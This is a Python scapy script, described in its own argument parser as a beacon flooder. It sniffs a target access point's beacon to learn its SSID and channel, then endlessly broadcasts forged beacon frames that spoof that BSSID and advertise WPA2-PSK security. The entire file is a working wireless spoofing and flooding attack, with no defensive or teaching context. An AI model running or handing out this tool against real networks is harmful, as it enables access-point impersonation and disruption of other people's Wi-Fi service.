from scapy.all import *
import sys
import argparse


ssid = None
bssid = None
channel = None


def packet_handler(pkt):
    if not (pkt.haslayer(Dot11) or pkt.haslayer(Dot11FCS)):
        return False

    if pkt.type != 0 or pkt.subtype != 8:
        return False

    if pkt.addr2 != bssid:
        return False

    global ssid
    ssid = pkt.info

    dot11_elt = pkt.getlayer(Dot11Elt)

    while dot11_elt:
        if dot11_elt.ID == 3:
            global channel
            channel = dot11_elt.info

        dot11_elt = dot11_elt.payload.getlayer(Dot11Elt)

    return True

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='This is a simple beacon flooder using scapy')
    parser.add_argument('-i', type=str, required=True, metavar='NIC', help='NIC name')
    parser.add_argument('-b', type=str, required=True, metavar='BSSID', help='BSSID of Beacon Frame')
    args = parser.parse_args()

    iface = args.i
    bssid = args.b.lower()

    sniff(iface=iface, monitor=True, stop_filter=packet_handler, timeout=5)

    if not ssid:
        print("Fail to resolve SSID from {0}".format(bssid))
        sys.exit(-1)

    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    ds_set = Dot11Elt(ID='DSset', info=channel)
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'  # RSN Version 1
        '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
        '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
        '\x00\x0f\xac\x04'  # AES Cipher
        '\x00\x0f\xac\x02'  # TKIP Cipher
        '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'  # Pre-Shared Key
        '\x00\x00'))  # RSN Capabilities (no extra capabilities)

    frame = RadioTap() / dot11 / beacon / essid / ds_set / rsn
    frame.show()

    sendp(frame, iface=iface, inter=0.100, loop=1, verbose=0)
